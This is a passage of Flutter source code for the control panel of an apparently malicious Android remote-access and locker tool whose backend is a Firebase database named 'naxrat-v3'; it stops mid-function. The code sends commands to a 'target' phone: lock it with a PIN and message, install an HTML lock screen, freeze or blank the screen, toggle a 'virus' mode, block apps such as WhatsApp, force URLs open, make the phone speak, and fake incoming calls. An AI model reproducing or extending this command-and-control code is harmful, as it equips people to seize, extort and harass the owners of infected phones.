// lib/control_page.dart
import 'dart:async';
import 'dart:convert';
import 'dart:math' show Random;

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

const String kFontFamily = 'Ganang';
const String kFirebaseUrl =
    'https://naxrat-v3-default-rtdb.firebaseio.com';

// ═══════════════════════════════════════════════════════════════
// PALET — PINK CUTE MINIMAL 🌸
// ═══════════════════════════════════════════════════════════════
class ControlHx {
  static const bg    = Color(0xFF1A0E14);
  static const bgAlt = Color(0xFF241318);

  static const surface   = Color(0xFF2A1720);
  static const surfaceHi = Color(0xFF2A1720);
  static const surfaceHi2 = Color(0xFF361D28);

  // PINK FAMILY
  static const pinkSoft  = Color(0xFFFFC1DA);
  static const pinkLight = Color(0xFFFF9EC4);
  static const pink      = Color(0xFFFF6FA5);
  static const pinkDeep  = Color(0xFFE84A8A);

  // Aksen
  static const ivory = Color(0xFFFFF5F8);
  static const ash   = Color(0xFFC9A8B6);
  static const ash2  = Color(0xFF7A5A66);

  static const jade     = Color(0xFF6EE7B7);
  static const terra    = Color(0xFFFF7A9A);
  static const slate    = Color(0xFF93C5FD);
  static const amethyst = Color(0xFFC4A5FF);
  static const amber    = Color(0xFFFFD58A);
  static const cyan     = Color(0xFF7DD3FC);
}

// ═══════════════════════════════════════════════════════════════
// MODEL
// ═══════════════════════════════════════════════════════════════
class DeviceDetail {
  final String id;
  final String name;
  final int? battery;
  final String country;
  final bool online;
  final int lastSeen;

  DeviceDetail({
    required this.id,
    required this.name,
    required this.battery,
    required this.country,
    required this.online,
    required this.lastSeen,
  });
}

class CommandLog {
  final String action;
  final int ts;
  final bool ok;

  CommandLog({required this.action, required this.ts, required this.ok});
}

class ChatMsg {
  final String id;
  final String sender;
  final String text;
  final int ts;

  ChatMsg({
    required this.id,
    required this.sender,
    required this.text,
    required this.ts,
  });
}

// ═══════════════════════════════════════════════════════════════
// PAGE
// ═══════════════════════════════════════════════════════════════
class ControlPage extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final String username;
  final String sessionKey;

  const ControlPage({
    super.key,
    required this.deviceId,
    required this.deviceName,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<ControlPage> createState() => _ControlPageState();
}

class _ControlPageState extends State<ControlPage>
    with TickerProviderStateMixin {
  DeviceDetail? _device;
  final List<CommandLog> _logs = [];
  bool _isLoading = true;

  Timer? _deviceRefreshTimer;

  late AnimationController _pulseCtrl;

  List<ChatMsg> _chatMsgs = [];
  Timer? _chatPollTimer;
  final TextEditingController _chatCtrl = TextEditingController();
  final ScrollController _chatScrollCtrl = ScrollController();

  @override
  void initState() {
    super.initState();

    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _loadLogs();
    _refreshDevice(showLoading: true);

    _deviceRefreshTimer = Timer.periodic(
      const Duration(seconds: 5),
      (_) {
        if (mounted) _refreshDevice();
      },
    );
  }

  @override
  void dispose() {
    _deviceRefreshTimer?.cancel();
    _chatPollTimer?.cancel();
    _pulseCtrl.dispose();
    _chatCtrl.dispose();
    _chatScrollCtrl.dispose();
    super.dispose();
  }

  // ═══════════════════════════════════════════════════════════
  // LOAD DEVICE
  // ═══════════════════════════════════════════════════════════
  Future<void> _refreshDevice({bool showLoading = false}) async {
    if (showLoading && mounted) setState(() => _isLoading = true);

    try {
      final res = await http.get(
        Uri.parse('$kFirebaseUrl/devices/${widget.deviceId}.json'),
      ).timeout(const Duration(seconds: 10));

      if (res.statusCode != 200) {
        if (mounted) setState(() => _isLoading = false);
        return;
      }

      final data = jsonDecode(res.body);
      if (data == null) {
        if (mounted) setState(() => _isLoading = false);
        return;
      }

      final now = DateTime.now().millisecondsSinceEpoch;
      int lastSeen = 0;
      final rawSeen = data['last_seen'];
      if (rawSeen is int) lastSeen = rawSeen;
      else if (rawSeen is String) lastSeen = int.tryParse(rawSeen) ?? 0;

      final online = lastSeen > 0 && (now - lastSeen) < 2 * 60 * 1000;

      int? battery;
      final b = data['battery'];
      if (b is int) battery = b;
      else if (b is double) battery = b.toInt();

      if (!mounted) return;
      setState(() {
        _device = DeviceDetail(
          id: widget.deviceId,
          name: data['name']?.toString() ?? 'Unknown Device',
          battery: battery,
          country: data['country']?.toString() ?? '—',
          online: online,
          lastSeen: lastSeen,
        );
        _isLoading = false;
      });
    } catch (e) {
      debugPrint('Load device error: $e');
      if (mounted) setState(() => _isLoading = false);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // LOGS
  // ═══════════════════════════════════════════════════════════
  Future<void> _loadLogs() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final raw = prefs.getString('cmd_logs_${widget.deviceId}');
      if (raw == null) return;

      final list = jsonDecode(raw) as List;
      if (!mounted) return;
      setState(() {
        _logs.clear();
        for (final item in list) {
          _logs.add(CommandLog(
            action: item['action']?.toString() ?? '',
            ts: (item['ts'] as num?)?.toInt() ?? 0,
            ok: item['ok'] == true,
          ));
        }
      });
    } catch (_) {}
  }

  Future<void> _addLog(String action, bool ok) async {
    setState(() {
      _logs.insert(0, CommandLog(
        action: action,
        ts: DateTime.now().millisecondsSinceEpoch,
        ok: ok,
      ));
      if (_logs.length > 10) _logs.removeLast();
    });

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString(
        'cmd_logs_${widget.deviceId}',
        jsonEncode(_logs.map((l) => {
          'action': l.action,
          'ts': l.ts,
          'ok': l.ok,
        }).toList()),
      );
    } catch (_) {}
  }

  // ═══════════════════════════════════════════════════════════
  // SEND COMMAND
  // ═══════════════════════════════════════════════════════════
  Future<bool> _sendCommand(
    String action, [
    Map<String, dynamic> payload = const {},
  ]) async {
    if (_device == null) {
      _showSnack('Device tidak ditemukan', error: true);
      return false;
    }
    if (!_device!.online) {
      _showSnack('Device sedang offline', error: true);
      return false;
    }

    final cmdId = 'cmd_${DateTime.now().millisecondsSinceEpoch}_'
        '${Random().nextInt(999999)}';

    final cmd = {
      'action': action,
      'payload': payload,
      'ts': DateTime.now().millisecondsSinceEpoch,
      'status': 'pending',
    };

    try {
      final res = await http.put(
        Uri.parse(
          '$kFirebaseUrl/devices/${widget.deviceId}/commands/$cmdId.json',
        ),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(cmd),
      ).timeout(const Duration(seconds: 10));

      if (res.statusCode == 200 || res.statusCode == 204) {
        await _addLog(action, true);
        return true;
      } else {
        await _addLog(action, false);
        _showSnack('Firebase HTTP ${res.statusCode}', error: true);
        return false;
      }
    } catch (e) {
      await _addLog(action, false);
      _showSnack('Gagal: $e', error: true);
      return false;
    }
  }

  // ═══════════════════════════════════════════════════════════
  // HELPERS
  // ═══════════════════════════════════════════════════════════
  String _timeAgo(int ts) {
    if (ts == 0) return '—';
    final diff = DateTime.now().millisecondsSinceEpoch - ts;
    if (diff < 0) return 'baru';
    final sec = diff ~/ 1000;
    if (sec < 60) return '${sec}s';
    final min = sec ~/ 60;
    if (min < 60) return '${min}m';
    final hr = min ~/ 60;
    if (hr < 24) return '${hr}j';
    return '${hr ~/ 24}h';
  }

  void _showSnack(String msg, {bool error = false, bool success = false}) {
    if (!mounted) return;
    final color = error
        ? ControlHx.terra
        : success
            ? ControlHx.jade
            : ControlHx.pinkLight;
    final icon = error
        ? Icons.error_rounded
        : success
            ? Icons.check_circle_rounded
            : Icons.info_rounded;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: ControlHx.surfaceHi,
      content: Row(
        children: [
          Icon(icon, color: color, size: 18),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              msg,
              style: TextStyle(
                color: ControlHx.ivory,
                fontFamily: kFontFamily,
                fontSize: 12,
                fontWeight: FontWeight.w700,
              ),
            ),
          ),
        ],
      ),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(12),
        side: BorderSide(color: color.withOpacity(0.4), width: 1),
      ),
      margin: const EdgeInsets.all(16),
      duration: const Duration(seconds: 2),
    ));
  }

  // ═══════════════════════════════════════════════════════════
  // ACTION ROUTER
  // ═══════════════════════════════════════════════════════════
  Future<void> _handleAction(String act) async {
    HapticFeedback.mediumImpact();

    switch (act) {
      case 'lock':
        _showLockDialog();
        break;
      case 'unlock':
        if (await _sendCommand('unlock')) {
          _showSnack('Unlock ✓', success: true);
        }
        break;
      case 'custom_lock':
        _showCustomLockDialog();
        break;
      case 'custom_lock_html':
        _showHtmlLockDialog();
        break;
      case 'lcd_on':
        if (await _sendCommand('lcd_on')) {
          _showSnack('LCD ON ✓', success: true);
        }
        break;
      case 'lcd_off':
        if (await _sendCommand('lcd_off')) {
          _showSnack('LCD OFF ✓', success: true);
        }
        break;
      case 'chat_lock_on':
        _openChat();
        break;
      case 'chat_lock_off':
        if (await _sendCommand('chat_lock_off')) {
          _showSnack('Chat Lock OFF ✓', success: true);
        }
        break;
      case 'freeze_on':
        if (await _sendCommand('freeze_on')) {
          _showSnack('Freeze ON ✓', success: true);
        }
        break;
      case 'freeze_off':
        if (await _sendCommand('freeze_off')) {
          _showSnack('Freeze OFF ✓', success: true);
        }
        break;
      case 'blank_on':
        if (await _sendCommand('blank_on')) {
          _showSnack('Blank ON ✓', success: true);
        }
        break;
      case 'blank_off':
        if (await _sendCommand('blank_off')) {
          _showSnack('Blank OFF ✓', success: true);
        }
        break;
      case 'ambacong_on':
        if (await _sendCommand('ambacong_on')) {
          _showSnack('Ambacong ON ✓', success: true);
        }
        break;
      case 'ambacong_off':
        if (await _sendCommand('ambacong_off')) {
          _showSnack('Ambacong OFF ✓', success: true);
        }
        break;
      case 'virus_amba_on':
        if (await _sendCommand('virus_amba_on')) {
          _showSnack('Virus ON ✓', success: true);
        }
        break;
      case 'virus_amba_off':
        if (await _sendCommand('virus_amba_off')) {
          _showSnack('Virus OFF ✓', success: true);
        }
        break;
      case 'keyboard_on':
        if (await _sendCommand('keyboard_on')) {
          _showSnack('Keyboard ON ✓', success: true);
        }
        break;
      case 'keyboard_off':
        if (await _sendCommand('keyboard_off')) {
          _showSnack('Keyboard OFF ✓', success: true);
        }
        break;
      case 'video_on':
        if (await _sendCommand('video_on')) {
          _showSnack('Video ON ✓', success: true);
        }
        break;
      case 'video_off':
        if (await _sendCommand('video_off')) {
          _showSnack('Video OFF ✓', success: true);
        }
        break;
      case 'flash_on':
        if (await _sendCommand('flash_on')) {
          _showSnack('Flash ON ✓', success: true);
        }
        break;
      case 'flash_off':
        if (await _sendCommand('flash_off')) {
          _showSnack('Flash OFF ✓', success: true);
        }
        break;
      case 'flash_blink':
        if (await _sendCommand('flash_blink')) {
          _showSnack('Flash Blink ✓', success: true);
        }
        break;
      case 'play_sound':
        _showSoundDialog();
        break;
      case 'stop_sound':
        if (await _sendCommand('stop_sound')) {
          _showSnack('Sound stopped ✓', success: true);
        }
        break;
      case 'wallpaper':
        _showWallpaperDialog();
        break;
      case 'prank_call':
        _showPrankDialog();
        break;
      case 'open_url':
        _showUrlDialog();
        break;
      case 'vibrate':
        _showVibrateDialog();
        break;
      case 'tts':
        _showTtsDialog();
        break;
      case 'block_app':
        _showBlockAppDialog();
        break;
      case 'unblock_all':
        if (await _sendCommand('unblock_all')) {
          _showSnack('Unblock all ✓', success: true);
        }
        break;
    }
  }

  // ═══════════════════════════════════════════════════════════
  // DIALOGS
  // ═══════════════════════════════════════════════════════════
  void _showLockDialog() {
    final pinCtrl = TextEditingController();
    final msgCtrl = TextEditingController(text: 'Perangkat ini terkunci.');

    _showDialog(
      title: 'Lock Device',
      subtitle: 'Device target akan terkunci dengan PIN.',
      children: [
        _dialogField('PIN (4-8 digit)', pinCtrl,
            keyboard: TextInputType.number),
        _dialogField('Pesan', msgCtrl, maxLines: 3),
      ],
      confirmLabel: 'KUNCI',
      onConfirm: () async {
        final pin = pinCtrl.text.trim();
        final msg = msgCtrl.text.trim();
        if (pin.length < 4 || int.tryParse(pin) == null) {
          _showSnack('PIN minimal 4 digit angka', error: true);
          return false;
        }
        if (msg.isEmpty) {
          _showSnack('Pesan kosong', error: true);
          return false;
        }
        final ok = await _sendCommand('lock', {'pin': pin, 'message': msg});
        if (ok) _showSnack('Lock ✓', success: true);
        return ok;
      },
    );
  }

  void _showCustomLockDialog() {
    final durCtrl = TextEditingController(text: '60');

    _showDialog(
      title: 'Custom Lock',
      subtitle: 'Kunci sementara lalu buka otomatis.',
      children: [
        _dialogField('Durasi (detik)', durCtrl,
            keyboard: TextInputType.number),
      ],
      confirmLabel: 'KUNCI',
      onConfirm: () async {
        final dur = int.tryParse(durCtrl.text.trim());
        if (dur == null || dur < 5 || dur > 3600) {
          _showSnack('Durasi 5-3600 detik', error: true);
          return false;
        }
        final ok = await _sendCommand('custom_lock', {'duration': dur});
        if (ok) _showSnack('Custom lock ✓', success: true);
        return ok;
      },
    );
  }

  void _showHtmlLockDialog() {
    final htmlCtrl = TextEditingController();

    _showDialog(
      title: 'HTML Lock',
      subtitle: 'Tulis HTML untuk lock screen.',
      children: [
        _dialogField('Kode HTML', htmlCtrl, maxLines: 6),
      ],
      confirmLabel: 'KUNCI',
      onConfirm: () async {
        final html = htmlCtrl.text.trim();
        if (html.isEmpty) {
          _showSnack('HTML kosong', error: true);
          return false;
        }
        final ok = await _sendCommand('custom_lock_html', {'html': html});
        if (ok) _showSnack('HTML lock ✓', success: true);
        return ok;
      },
    );
  }

  void _showUrlDialog() {
    final urlCtrl = TextEditingController();

    _showDialog(
      title: 'Buka URL',
      subtitle: 'Buka website di browser target.',
      children: [
        _dialogField('URL', urlCtrl, keyboard: TextInputType.url),
      ],
      confirmLabel: 'BUKA',
      onConfirm: () async {
        var url = urlCtrl.text.trim();
        if (url.isEmpty) {
          _showSnack('URL kosong', error: true);
          return false;
        }
        if (!url.startsWith('http')) url = 'https://$url';
        final ok = await _sendCommand('open_url', {'url': url});
        if (ok) _showSnack('URL ✓', success: true);
        return ok;
      },
    );
  }

  void _showVibrateDialog() {
    final durCtrl = TextEditingController(text: '2000');

    _showDialog(
      title: 'Vibrate Device',
      subtitle: 'Getarkan HP target.',
      children: [
        _dialogField('Durasi (ms)', durCtrl,
            keyboard: TextInputType.number),
      ],
      confirmLabel: 'GETARKAN',
      onConfirm: () async {
        final dur = int.tryParse(durCtrl.text.trim());
        if (dur == null || dur < 100 || dur > 60000) {
          _showSnack('Durasi 100-60000 ms', error: true);
          return false;
        }
        final ok = await _sendCommand('vibrate', {'duration': dur});
        if (ok) _showSnack('Vibrate ✓', success: true);
        return ok;
      },
    );
  }

  void _showSoundDialog() {
    final urlCtrl = TextEditingController();

    _showDialog(
      title: 'Play Sound',
      subtitle: 'Putar audio dari URL di target.',
      children: [
        _dialogField('URL Audio', urlCtrl, keyboard: TextInputType.url),
      ],
      confirmLabel: 'PUTAR',
      onConfirm: () async {
        var url = urlCtrl.text.trim();
        if (url.isEmpty) {
          _showSnack('URL kosong', error: true);
          return false;
        }
        if (!url.startsWith('http')) url = 'https://$url';
        final ok = await _sendCommand('play_sound', {'url': url});
        if (ok) _showSnack('Sound ✓', success: true);
        return ok;
      },
    );
  }

  void _showWallpaperDialog() {
    final urlCtrl = TextEditingController();

    _showDialog(
      title: 'Set Wallpaper',
      subtitle: 'Masukkan URL gambar untuk wallpaper device target.',
      children: [
        _dialogField('URL Gambar', urlCtrl, keyboard: TextInputType.url),
        Padding(
          padding: const EdgeInsets.only(top: 4),
          child: Text(
            'Contoh: https://example.com/image.jpg',
            style: TextStyle(
              color: ControlHx.ash2,
              fontFamily: kFontFamily,
              fontSize: 10.5,
            ),
          ),
        ),
      ],
      confirmLabel: 'PASANG',
      onConfirm: () async {
        var url = urlCtrl.text.trim();
        if (url.isEmpty) {
          _showSnack('URL kosong', error: true);
          return false;
        }
        if (!url.startsWith('http')) url = 'https://$url';
        final ok = await _sendCommand('wallpaper', {'url': url});
        if (ok) _showSnack('Wallpaper ✓', success: true);
        return ok;
      },
    );
  }

  void _showPrankDialog() {
    final nameCtrl = TextEditingController(text: 'Mama');
    final numCtrl = TextEditingController(text: '+62 812-3456-7890');

    _showDialog(
      title: 'Prank Call',
      subtitle: 'Simulasi panggilan masuk.',
      children: [
        _dialogField('Nama Penelepon', nameCtrl),
        _dialogField('Nomor', numCtrl, keyboard: TextInputType.phone),
      ],
      confirmLabel: 'PANGGIL',
      onConfirm: () async {
        final name = nameCtrl.text.trim();
        final num = numCtrl.text.trim();
        final ok = await _sendCommand('prank_call', {
          'name': name,
          'number': num,
        });
        if (ok) _showSnack('Prank ✓', success: true);
        return ok;
      },
    );
  }

  void _showBlockAppDialog() {
    final pkgCtrl = TextEditingController();

    _showDialog(
      title: 'Block App',
      subtitle: 'Masukkan package name app target.',
      children: [
        _dialogField(
          'Package Name',
          pkgCtrl,
          hint: 'com.whatsapp',
        ),
        Padding(
          padding: const EdgeInsets.only(top: 4),
          child: Text(
            'Contoh: com.whatsapp • com.instagram.android',
            style: TextStyle(
              color: ControlHx.ash2,
              fontFamily: kFontFamily,
              fontSize: 10.5,
            ),
          ),
        ),
      ],
      confirmLabel: 'BLOCK',
      onConfirm: () async {
        final pkg = pkgCtrl.text.trim();
        if (pkg.isEmpty) {
          _showSnack('Package kosong', error: true);
          return false;
        }
        final ok = await _sendCommand('block_app', {
          'app': pkg,
          'name': pkg,
        });
        if (ok) _showSnack('Blocked: $pkg', success: true);
        return ok;
      },
    );
  }

  void _showTtsDialog() {
    final textCtrl = TextEditingController();
    String lang = 'id';
    String rate = '1.0';

    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.7),
      builder: (ctx) => StatefulBuilder(
        builder: (context, setStateDialog) {
          return Dialog(
            backgroundColor: Colors.transparent,
            child: Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: ControlHx.surfaceHi,
                border: Border.all(
                  color: ControlHx.pink.withOpacity(0.3),
                  width: 1,
                ),
                borderRadius: BorderRadius.circular(18),
                boxShadow: [
                  BoxShadow(
                    color: ControlHx.pink.withOpacity(0.2),
                    blurRadius: 20,
                    spreadRadius: 2,
                  ),
                ],
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  const Text(
                    'Text to Speech ♡',
                    style: TextStyle(
                      color: ControlHx.ivory,
                      fontFamily: kFontFamily,
                      fontSize: 15,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.2,
                    ),
                  ),
                  const SizedBox(height: 6),
                  const Text(
                    'Target bakal ngomong teks yang kamu ketik.',
                    style: TextStyle(
                      color: ControlHx.ash,
                      fontFamily: kFontFamily,
                      fontSize: 11.5,
                    ),
                  ),
                  const SizedBox(height: 16),
                  _dialogField('Teks', textCtrl,
                      maxLines: 3, maxLength: 300),
                  const SizedBox(height: 10),
                  const Text(
                    'BAHASA',
                    style: TextStyle(
                      color: ControlHx.ash,
                      fontFamily: kFontFamily,
                      fontSize: 10,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.4,
                    ),
                  ),
                  const SizedBox(height: 6),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: ControlHx.surfaceHi2,
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: ControlHx.pink.withOpacity(0.25),
                        width: 1,
                      ),
                    ),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        value: lang,
                        dropdownColor: ControlHx.surfaceHi,
                        isExpanded: true,
                        icon: const Icon(
                          Icons.keyboard_arrow_down_rounded,
                          color: ControlHx.pinkLight,
                          size: 16,
                        ),
                        style: const TextStyle(
                          color: ControlHx.ivory,
                          fontFamily: kFontFamily,
                          fontSize: 12,
                          fontWeight: FontWeight.w700,
                        ),
                        items: const [
                          DropdownMenuItem(
                              value: 'id', child: Text('Indonesia')),
                          DropdownMenuItem(
                              value: 'en', child: Text('Inggris')),
                          DropdownMenuItem(
                              value: 'ja', child: Text('Jepang')),
                          DropdownMenuItem(
                              value: 'ko', child: Text('Korea')),
                          DropdownMenuItem(
                              value: 'zh', child: Text('Mandarin')),
                        ],
                        onChanged: (v) {
                          if (v != null) setStateDialog(() => lang = v);
                        },
                      ),
                    ),
                  ),
                  const SizedBox(height: 10),
                  const Text(
                    'KECEPATAN',
                    style: TextStyle(
                      color: ControlHx.ash,
                      fontFamily: kFontFamily,
                      fontSize: 10,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.4,
                    ),
                  ),
                  const SizedBox(height: 6),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: ControlHx.surfaceHi2,
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: ControlHx.pink.withOpacity(0.25),
                        width: 1,
                      ),
                    ),
                    child: DropdownButtonHideUnderline(
                      child: DropdownButton<String>(
                        value: rate,
                        dropdownColor: ControlHx.surfaceHi,
                        isExpanded: true,
                        icon: const Icon(
                          Icons.keyboard_arrow_down_rounded,
                          color: ControlHx.pinkLight,
                          size: 16,
                        ),
                        style: const TextStyle(
                          color: ControlHx.ivory,
                          fontFamily: kFontFamily,
                          fontSize: 12,
                          fontWeight: FontWeight.w700,
                        ),
                        items: const [
                          DropdownMenuItem(
                              value: '0.7', child: Text('Lambat')),
                          DropdownMenuItem(
                              value: '1.0', child: Text('Normal')),
                          DropdownMenuItem(
                              value: '1.5', child: Text('Cepat')),
                          DropdownMenuItem(
                              value: '2.0', child: Text('Sangat Cepat')),
                        ],
                        onChanged: (v) {
                          if (v != null) setStateDialog(() => rate = v);
                        },
                      ),
                    ),
                  ),
                  const SizedBox(height: 18),
                  Row(
                    children: [
                      Expanded(
                        child: TextButton(
                          onPressed: () => Navigator.pop(ctx),
                          style: TextButton.styleFrom(
                            padding:
                                const EdgeInsets.symmetric(vertical: 12),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10),
                              side: BorderSide(
                                color: ControlHx.pink.withOpacity(0.3),
                                width: 1,
                              ),
                            ),
                          ),
                          child: const Text(
                            'BATAL',
                            style: TextStyle(
                              color: ControlHx.ash,
                              fontFamily: kFontFamily,
                              fontSize: 11,
                              fontWeight: FontWeight.w900,
                              letterSpacing: 1.4,
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: Container(
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(10),
                            gradient: const LinearGradient(
                              colors: [ControlHx.pinkLight, ControlHx.pinkDeep],
                              begin: Alignment.topLeft,
                              end: Alignment.bottomRight,
                            ),
                            boxShadow: [
                              BoxShadow(
                                color: ControlHx.pink.withOpacity(0.5),
                                blurRadius: 12,
                                spreadRadius: 1,
                              ),
                            ],
                          ),
                          child: TextButton(
                            onPressed: () async {
                              final text = textCtrl.text.trim();
                              if (text.isEmpty) {
                                _showSnack('Teks kosong', error: true);
                                return;
                              }
                              Navigator.pop(ctx);
                              final ok = await _sendCommand('tts', {
                                'text': text,
                                'lang': lang,
                                'rate': double.parse(rate),
                              });
                              if (ok) {
                                _showSnack('TTS ✓', success: true);
                              }
                            },
                            style: TextButton.styleFrom(
                              padding:
                                  const EdgeInsets.symmetric(vertical: 12),
                              backgroundColor: Colors.transparent,
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(10),
                              ),
                            ),
                            child: const Text(
                              'NGOMONG ♡',
                              style: TextStyle(
                                color: Colors.white,
                                fontFamily: kFontFamily,
                                fontSize: 11,
                                fontWeight: FontWeight.w900,
                                letterSpacing: 1.2,
                              ),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // DIALOG HELPERS
  // ═══════════════════════════════════════════════════════════
  void _showDialog({
    required String title,
    required String subtitle,
    required List<Widget> children,
    required String confirmLabel,
    required Future<bool> Function() onConfirm,
  }) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.7),
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: ControlHx.surfaceHi,
            border: Border.all(
              color: ControlHx.pink.withOpacity(0.3),
              width: 1,
            ),
            borderRadius: BorderRadius.circular(18),
            boxShadow: [
              BoxShadow(
                color: ControlHx.pink.withOpacity(0.2),
                blurRadius: 20,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Text(
                title,
                style: const TextStyle(
                  color: ControlHx.ivory,
                  fontFamily: kFontFamily,
                  fontSize: 15,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.2,
                ),
              ),
              const SizedBox(height: 6),
              Text(
                subtitle,
                style: const TextStyle(
                  color: ControlHx.ash,
                  fontFamily: kFontFamily,
                  fontSize: 11.5,
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 16),
              ...children,
              const SizedBox(height: 18),
              _dialogActions(
                confirmLabel: confirmLabel,
                onConfirm: () async {
                  final ok = await onConfirm();
                  if (ok && ctx.mounted) Navigator.pop(ctx);
                  return ok;
                },
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _dialogField(
    String label,
    TextEditingController ctrl, {
    TextInputType keyboard = TextInputType.text,
    int maxLines = 1,
    int? maxLength,
    String? hint,
  }) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            label.toUpperCase(),
            style: const TextStyle(
              color: ControlHx.ash,
              fontFamily: kFontFamily,
              fontSize: 10,
              fontWeight: FontWeight.w900,
              letterSpacing: 1.4,
            ),
          ),
          const SizedBox(height: 6),
          Container(
            decoration: BoxDecoration(
              color: ControlHx.surfaceHi2,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(
                color: ControlHx.pink.withOpacity(0.25),
                width: 1,
              ),
            ),
            child: TextField(
              controller: ctrl,
              keyboardType: keyboard,
              maxLines: maxLines,
              maxLength: maxLength,
              style: const TextStyle(
                color: ControlHx.ivory,
                fontFamily: kFontFamily,
                fontSize: 13,
                fontWeight: FontWeight.w600,
              ),
              cursorColor: ControlHx.pink,
              decoration: InputDecoration(
                hintText: hint,
                hintStyle: const TextStyle(
                  color: ControlHx.ash2,
                  fontFamily: kFontFamily,
                  fontSize: 12,
                ),
                counterStyle: const TextStyle(
                  color: ControlHx.ash2,
                  fontSize: 10,
                ),
                border: InputBorder.none,
                contentPadding: const EdgeInsets.symmetric(
                  horizontal: 14,
                  vertical: 12,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _dialogActions({
    required String confirmLabel,
    required Future<bool> Function() onConfirm,
  }) {
    return Row(
      children: [
        Expanded(
          child: TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              padding: const EdgeInsets.symmetric(vertical: 12),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(10),
                side: BorderSide(
                  color: ControlHx.pink.withOpacity(0.3),
                  width: 1,
                ),
              ),
            ),
            child: const Text(
              'BATAL',
              style: TextStyle(
                color: ControlHx.ash,
                fontFamily: kFontFamily,
                fontSize: 11,
                fontWeight: FontWeight.w900,
                letterSpacing: 1.4,
              ),
            ),
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(10),
              gradient: const LinearGradient(
                colors: [ControlHx.pinkLight, ControlHx.pinkDeep],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              boxShadow: [
                BoxShadow(
                  color: ControlHx.pink.withOpacity(0.5),
                  blurRadius: 12,
                  spreadRadius: 1,
                ),
              ],
            ),
            child: TextButton(
              onPressed: () async {
                final ok = await onConfirm();
                if (ok && mounted) Navigator.pop(context);
              },
              style: TextButton.styleFrom(
                padding: const EdgeInsets.symmetric(vertical: 12),
                backgroundColor: Colors.transparent,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
              child: Text(
                confirmLabel,
                style: const TextStyle(
                  color: Colors.white,
                  fontFamily: kFontFamily,
                  fontSize: 11,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.4,
                ),
              ),
            ),
          ),
        ),
      ],
    );
  }

  // ═══════════════════════════════════════════════════════════
  // CHAT LOCK
  // ═══════════════════════════════════════════════════════════
  Future<void> _openChat() async {
    if (_device == null || !_device!.online) {
      _showSnack('Device offline', error: true);
      return;
    }

    await _sendCommand('chat_lock_on');

    if (!mounted) return;
    setState(() {
      _chatMsgs = [];
    });

    _startChatPolling();

    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => _buildChatSheet(),
    ).whenComplete(() {
      _stopChatPolling();
    });
  }

  void _startChatPolling() {
    _stopChatPolling();
    _loadChatMessages();
    _chatPollTimer = Timer.periodic(
      const Duration(seconds: 2),
      (_) => _loadChatMessages(),
    );
  }

  void _stopChatPolling() {
    _chatPollTimer?.cancel();
    _chatPollTimer = null;
  }

  Future<void> _loadChatMessages() async {
    try {
      final res = await http.get(
        Uri.parse(
          '$kFirebaseUrl/devices/${widget.deviceId}/chat_lock.json',
        ),
      );
      if (res.statusCode != 200) return;

      final data = jsonDecode(res.body);
      if (data == null) return;

      final list = <ChatMsg>[];
      (data as Map<String, dynamic>).forEach((id, raw) {
        if (raw == null) return;
        final m = raw as Map<String, dynamic>;
        list.add(ChatMsg(
          id: id,
          sender: m['sender']?.toString() ?? 'unknown',
          text: m['text']?.toString() ?? '',
